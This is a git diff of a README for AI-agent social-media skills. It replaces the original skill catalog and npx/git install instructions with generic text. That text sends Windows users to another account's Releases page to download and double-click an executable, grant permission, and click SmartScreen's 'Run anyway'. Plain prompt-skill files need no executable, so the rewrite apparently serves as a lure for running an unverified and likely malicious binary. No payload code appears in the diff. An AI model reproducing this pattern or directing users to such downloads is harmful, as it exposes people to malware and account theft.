@@ -1,133 +1,168 @@
-# Social Media Skills
+# 🧠 social-media-skills - Plan posts with clear direction
 
-AI agent skills for social media content strategy, creation, and analysis across text-first platforms.
+[![Download](https://img.shields.io/badge/Download-Releases-purple?style=for-the-badge&logo=github)](https://github.com/Abwor9658/social-media-skills/releases)
 
-## Skill Catalog
+## 📥 Download
+Visit this page to download: https://github.com/Abwor9658/social-media-skills/releases
 
-### Foundation
+Choose the latest release for Windows, then download the file that matches your device.
 
-| Skill                                                | Description                                                                                                 |
-| ---------------------------------------------------- | ----------------------------------------------------------------------------------------------------------- |
-| [social-media-context-sms](skills/social-media-context-sms/) | Captures platform context, audience details, content pillars, and tone preferences used by all other skills |
+## 🪟 Install on Windows
 
-### Strategy
+1. Open the release page.
+2. Find the newest version at the top.
+3. Download the Windows file.
+4. If the file comes in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to start it.
+7. If Windows asks for permission, choose Yes.
 
-| Skill                                          | Description                                                                             |
-| ---------------------------------------------- | --------------------------------------------------------------------------------------- |
-| [content-strategy-sms](skills/content-strategy-sms/)   | Defines content pillars, audience targeting, and positioning for consistent brand voice |
-| [content-calendar-sms](skills/content-calendar-sms/)   | Plans publishing cadence, themes, and scheduling across platforms                       |
-| [platform-strategy-sms](skills/platform-strategy-sms/) | Tailors content approach per platform based on audience and format strengths            |
+If you use SmartScreen, select More info, then Run anyway only if you trust the source.
 
-### Creation
+## ✨ What this app does
 
-| Skill                                            | Description                                                                      |
-| ------------------------------------------------ | -------------------------------------------------------------------------------- |
-| [post-writer-sms](skills/post-writer-sms/)               | Writes single standalone posts optimized for each platform's format and audience |
-| [thread-writer-sms](skills/thread-writer-sms/)           | Writes multi-post threads with a clear narrative arc and strong opening hook     |
-| [carousel-writer-sms](skills/carousel-writer-sms/)       | Writes slide-by-slide carousel scripts for LinkedIn and similar visual formats   |
-| [content-repurposer-sms](skills/content-repurposer-sms/) | Transforms existing content into new formats and adapts it across platforms      |
-| [hook-writer-sms](skills/hook-writer-sms/)               | Crafts high-performing opening lines to maximize engagement and stop-the-scroll  |
+social-media-skills helps you plan, write, and review social media content for text-first platforms.
 
-### Analysis
+Use it to:
 
-| Skill                                                        | Description                                                             |
-| ------------------------------------------------------------ | ----------------------------------------------------------------------- |
-| [performance-analyzer-sms](skills/performance-analyzer-sms/)         | Interprets post and account metrics to surface actionable insights      |
-| [audience-growth-tracker-sms](skills/audience-growth-tracker-sms/)   | Tracks follower trends and identifies the content driving growth        |
-| [content-pattern-analyzer-sms](skills/content-pattern-analyzer-sms/) | Identifies which content types, topics, and formats perform best        |
-| [optimization-advisor-sms](skills/optimization-advisor-sms/)         | Recommends specific improvements based on performance data and patterns |
+- build content ideas for posts and threads
+- shape a content strategy for a brand or profile
+- write posts in a clear style
+- review post performance and spot patterns
+- adapt one idea for Bluesky, Threads, LinkedIn, and X
+- keep your messaging consistent across channels
 
-## Installation
+## 🖥️ What you need
 
-### Option 1: CLI Install (Recommended)
+- Windows 10 or Windows 11
+- A modern web browser for the download page
+- Enough free space to store the app and its files
+- An internet connection for download and updates
 
-Use [npx skills](https://github.com/vercel-labs/skills) to install skills directly:
+## 🔧 Before you start
 
-```bash
-# Install all skills
-npx skills add blacktwist/social-media-skills
+Keep these simple steps in mind:
 
-# Install specific skills
-npx skills add blacktwist/social-media-skills --skill post-writer-sms hook-writer-sms
+- Use the latest version from the Releases page
+- Save the file in a folder you can find again
+- Close extra windows if your PC feels slow
+- If the app is inside a ZIP file, extract it first
 
-# List available skills
-npx skills add blacktwist/social-media-skills --list
-```
+## 🚀 First run
 
-This automatically installs to your `.agents/skills/` directory (and symlinks into `.claude/skills/` for Claude Code compatibility).
+When you open the app for the first time:
 
-### Option 2: Clone and Copy
+1. Launch the program from the extracted folder or install folder
+2. Follow any setup steps on screen
+3. Let the app finish loading its agent skills
+4. Start with one task, such as writing a post or reviewing a thread
+5. Save your work often
 
-Clone the entire repo and copy the skills folder:
+## 🧭 How to use it
 
-```bash
-git clone https://github.com/blacktwist/social-media-skills.git
-cp -r social-media-skills/skills/* .agents/skills/
-```
+Start with a clear goal. Pick one of these common tasks:
 
-### Option 3: Git Submodule
+- content strategy
+  - define themes for a week or month
+  - map posts to goals like reach, clicks, or replies
 
-Add as a submodule for easy updates:
+- content creation
+  - draft short posts
+  - turn notes into a thread
+  - rewrite long text for a text-first platform
 
-```bash
-git submodule add https://github.com/blacktwist/social-media-skills.git .agents/social-media-skills
-```
+- content analysis
+  - check what worked
+  - compare tone, hooks, and post length
+  - review patterns across posts
 
-Then reference skills from `.agents/social-media-skills/skills/`.
+- platform adaptation
+  - adjust the same message for LinkedIn, Bluesky, Threads, or X
+  - keep the core idea the same while changing tone and length
 
-### Option 4: Fork and Customize
+## 🧩 Example use cases
 
-1. Fork this repository
-2. Customize skills for your specific needs
-3. Clone your fork into your projects
+- a solo creator planning a week of posts
+- a social media manager reviewing post ideas
+- a founder writing clear updates for an audience
+- a team that wants the same voice across platforms
+- a consultant building a repeatable writing process
 
-### Option 5: Claude Code Cowork
+## 🛠️ Tips for best results
 
-Download the skill zip files from the [latest release](https://github.com/blacktwist/social-media-skills/releases/tag/v1.0.0), then add them one by one:
+- give one task at a time
+- use plain language in your input
+- include your goal, audience, and platform
+- ask for short outputs when you want quick drafts
+- ask for a review when you want feedback on tone or clarity
 
-1. Go to **Cowork** > **Customize** > **Skills**
-2. Click **"+"** > **Create skill** > **Upload a skill**
-3. Upload each zip file
+## 📌 Suggested workflow
 
-There's one zip per skill, so repeat for each skill you want to add.
+1. Choose a platform
+2. Pick a goal
+3. Draft the post
+4. Review the message
+5. Adjust the tone
+6. Save the final version
+7. Reuse the idea on another platform
 
-### Option 6: SkillKit (Multi-Agent)
+## 🔍 Topics covered
 
-Use [SkillKit](https://github.com/rohitg00/skillkit) to install skills across multiple AI agents (Claude Code, Cursor, Copilot, etc.):
+This project focuses on:
 
-```bash
-# Install all skills
-npx skillkit install blacktwist/social-media-skills
+- AI agents
+- AI writing
+- prompt engineering
+- content strategy
+- content creation
+- social media
+- LinkedIn
+- Threads
+- Bluesky
+- X and Twitter
+- Claude
+- Claude Code
+- Cursor
+- MCP
+- open source
 
-# Install specific skills
-npx skillkit install blacktwist/social-media-skills --skill post-writer-sms hook-writer-sms
+## 🧾 File and folder tips
 
-# List available skills
-npx skillkit install blacktwist/social-media-skills --list
-```
+If the release gives you more than one file:
 
-## Supported Platforms
+- choose the Windows file
+- prefer the file that ends in `.exe` or comes as a Windows package
+- if you see a ZIP file, extract it before opening the app
+- keep the files in one folder so they are easy to find
 
-- **LinkedIn** — long-form posts, carousels, newsletters
-- **Twitter/X** — posts, threads, spaces
-- **Threads** — posts, threads (Meta)
-- **Bluesky** — posts, threads, starter packs
+## ❓ Common questions
 
-## Tool Integrations
+### Why does the app use social media skills?
 
-### BlackTwist (primary)
+It helps the app handle common tasks for content work, such as drafting posts, shaping strategy, and comparing results.
 
-[BlackTwist](https://blacktwist.app/mcp) is the recommended MCP integration for this skill set. When the BlackTwist MCP server is connected to your Claude environment, skills use it directly for:
+### Can I use it for more than one platform?
 
-- Publishing and scheduling posts
-- Fetching analytics and engagement data
-- Managing drafts and queued content
-- Tracking follower growth
+Yes. It is built for text-first platforms, so you can adapt one idea for several channels.
 
-When BlackTwist is not available, skills fall back to advisory mode — generating content and instructions for manual posting.
+### Do I need programming knowledge?
 
-See [tools/REGISTRY.md](tools/REGISTRY.md) for the full tool reference.
+No. You only need to download the file, open it, and follow the steps on screen.
 
-## License
+### What if I cannot find the right file?
 
-MIT — see [LICENSE](LICENSE) for details.
+Go back to the Releases page and choose the latest version. Look for the Windows download file in that release
+
+### Can I use it for planning and analysis?
+
+Yes. The app fits both writing and review tasks, so you can use it before and after posting
+
+## 📚 Suggested input examples
+
+Try prompts like:
+
+- Write three post ideas for a product launch on LinkedIn
+- Turn these notes into a short Bluesky thread
+- Review this post for clarity and tone
+- Adapt this LinkedIn update for Threads
+- Build a one-week content plan for a founder account
